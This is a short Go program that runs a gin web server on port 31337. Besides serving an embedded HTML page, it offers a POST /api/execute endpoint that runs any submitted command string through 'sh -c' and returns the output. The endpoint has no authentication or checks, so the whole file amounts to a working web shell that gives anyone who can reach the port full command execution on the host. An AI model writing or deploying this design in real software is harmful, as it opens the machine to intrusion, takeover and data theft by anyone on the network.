package main

import (
	"embed"
	"log"
	"net/http"
	"os/exec"

	"github.com/gin-gonic/gin"
)

//go:embed static/index.html
var content embed.FS

type CommandRequest struct {
	Command string `json:"command"`
}

type CommandResponse struct {
	Output string `json:"output,omitempty"`
	Error  string `json:"error,omitempty"`
}

func executeCommand(command string) (string, error) {
	cmd := exec.Command("sh", "-c", command)

	output, err := cmd.CombinedOutput()
	return string(output), err
}

func main() {
	router := gin.Default()

	router.GET("/", func(c *gin.Context) {
		file, err := content.ReadFile("static/index.html")
		if err != nil {
			c.String(http.StatusInternalServerError, "Error reading file: %v", err)
			return
		}
		c.Data(http.StatusOK, "text/html", file)
	})

	// POST API to execute commands
	router.POST("/api/execute", func(c *gin.Context) {
		var req CommandRequest
		if err := c.BindJSON(&req); err != nil {
			c.JSON(http.StatusBadRequest, CommandResponse{Error: err.Error()})
			return
		}

		output, err := executeCommand(req.Command)
		if err != nil {
			c.JSON(http.StatusOK, CommandResponse{Output: output, Error: err.Error()})
		} else {
			c.JSON(http.StatusOK, CommandResponse{Output: output})
		}
	})

	if err := router.Run(":31337"); err != nil {
		log.Fatal(err)
	}
}
